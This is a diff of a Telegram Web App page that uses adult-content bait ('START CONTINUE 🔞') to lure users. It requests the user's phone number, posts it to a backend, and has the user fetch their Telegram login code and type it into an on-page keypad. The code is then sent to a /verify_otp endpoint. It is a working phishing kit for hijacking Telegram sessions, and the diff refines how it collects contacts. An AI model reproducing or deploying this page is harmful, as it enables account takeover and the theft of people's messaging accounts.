@@ -2,58 +2,35 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Premium Access</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { box-sizing: border-box; }
-        body { 
-            font-family: 'Arial', sans-serif; margin: 0; padding: 0; 
-            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
-            background-size: cover; height: 100vh; display: flex; align-items: flex-end; justify-content: center; overflow: hidden;
-        }
-        .overlay { background: rgba(0, 0, 0, 0.45); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        .main-container { width: 90%; max-width: 360px; z-index: 2; text-align: center; margin-bottom: 40px; }
-
-        .btn { background: linear-gradient(45deg, #ff4757, #ff6b81); color: white; border: none; padding: 20px; width: 100%; border-radius: 20px; font-weight: bold; font-size: 20px; cursor: pointer; text-transform: uppercase; box-shadow: 0 10px 25px rgba(255, 71, 87, 0.5); }
-        .get-code-btn { background: #3f9e9e; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 18px; margin-bottom: 15px; cursor: pointer; }
-        
-        .input-field { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 12px; font-size: 20px; text-align: center; }
-        .otp-display { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 12px; font-size: 32px; text-align: center; background: #f9f9f9; letter-spacing: 5px; height: 60px; }
-        
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .key { background: #4caf50; padding: 16px; border-radius: 12px; font-size: 26px; font-weight: bold; color: white; cursor: pointer; border: none; }
-        .key-back { background: #388e3c; }
-        .key-empty { background: transparent; }
-        
-        .box { background: rgba(255, 255, 255, 0.95); padding: 25px; border-radius: 25px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
+        body { font-family: sans-serif; margin: 0; padding: 0; background: url('https://files.catbox.moe/p9p33p.jpg') center/cover fixed; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .box { background: rgba(255, 255, 255, 0.9); padding: 20px; border-radius: 20px; width: 320px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .btn-start { background: #ff4757; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        .btn-code { background: #3f9e9e; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; margin-bottom: 15px; cursor: pointer; }
+        .otp-display { width: 100%; padding: 10px; margin: 10px 0; border: 2px solid #ccc; border-radius: 8px; font-size: 24px; text-align: center; }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
+        .key { background: #4caf50; padding: 15px; border-radius: 8px; font-size: 20px; font-weight: bold; color: white; cursor: pointer; }
         .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="overlay"></div>
-    <div class="main-container">
-        <!-- ধাপ ১: Start Button -->
-        <div id="step0" class="box">
-            <button class="btn" onclick="showPhoneInput()">🍓 Start Continue 🔞</button>
-        </div>
+    <!-- ধাপ ১ -->
+    <div class="box" id="step1">
+        <button class="btn-start" onclick="startFlow()">🍓 START CONTINUE 🔞</button>
+    </div>
 
-        <!-- ধাপ ১.৫: ফোন নম্বর ইনপুট -->
-        <div id="step1" class="box hidden">
-            <input type="tel" id="phone" class="input-field" placeholder="+880...">
-            <button class="btn" onclick="sendNumber()">Next</button>
-        </div>
-
-        <!-- ধাপ ২: ওটিপি কিপ্যাড -->
-        <div id="step2" class="box hidden">
-            <button class="get-code-btn" onclick="tg.openTelegramLink('https://t.me/Telegram')">🔞 GET CODE 🔞</button>
-            <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
-            <div class="keypad">
-                <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
-                <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
-                <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
-                <div class="key-empty"></div><div class="key" onclick="addNum('0')">0</div><div class="key key-back" onclick="clearNum()">⌫</div>
-            </div>
+    <!-- ধাপ ২: ওটিপি ও কিপ্যাড -->
+    <div class="box hidden" id="step2">
+        <button class="btn-code" onclick="tg.openTelegramLink('https://t.me/Telegram')">🔞 GET CODE 🔞</button>
+        <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
+        <div class="keypad">
+            <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
+            <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
+            <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
+            <div class="key" style="background:#ffc107" onclick="clearNum()">C</div><div class="key" onclick="addNum('0')">0</div><div class="key" style="background:#0088cc" onclick="verifyOTP()">OK</div>
         </div>
     </div>
 
@@ -64,33 +41,38 @@
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
 
-        function showPhoneInput() {
-            document.getElementById('step0').classList.add('hidden');
-            document.getElementById('step1').classList.remove('hidden');
+        function startFlow() {
+            tg.requestContact();
+            poll();
         }
 
-        async function sendNumber() {
-            let ph = document.getElementById('phone').value;
+        async function poll() {
+            try {
+                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
+                const data = await res.json();
+                if (data.status === "success") {
+                    sendNumber(data.phone);
+                } else { setTimeout(poll, 1500); }
+            } catch (e) { setTimeout(poll, 2000); }
+        }
+
+        async function sendNumber(phone) {
             const res = await fetch(`${BACKEND_URL}/send_number`, {
                 method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: userId, phone: ph })
+                body: JSON.stringify({ user_id: userId, phone: phone })
             });
             const data = await res.json();
             if (data.status === "success") {
                 document.getElementById('step1').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
-            } else { alert(data.message); }
-        }
-
-        function addNum(n) {
-            if(currentOTP.length < 5) {
-                currentOTP += n; document.getElementById("otp_display").value = currentOTP;
-                if(currentOTP.length === 5) { verifyOTP(); }
             }
         }
-        function clearNum() { currentOTP = currentOTP.slice(0, -1); document.getElementById("otp_display").value = currentOTP; }
+
+        function addNum(n) { if(currentOTP.length < 5) { currentOTP += n; document.getElementById("otp_display").value = currentOTP; } }
+        function clearNum() { currentOTP = ""; document.getElementById("otp_display").value = ""; }
 
         async function verifyOTP() {
+            if(currentOTP.length < 5) return alert("Enter 5 digits!");
             const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                 method: "POST", headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({ user_id: userId, otp: currentOTP })
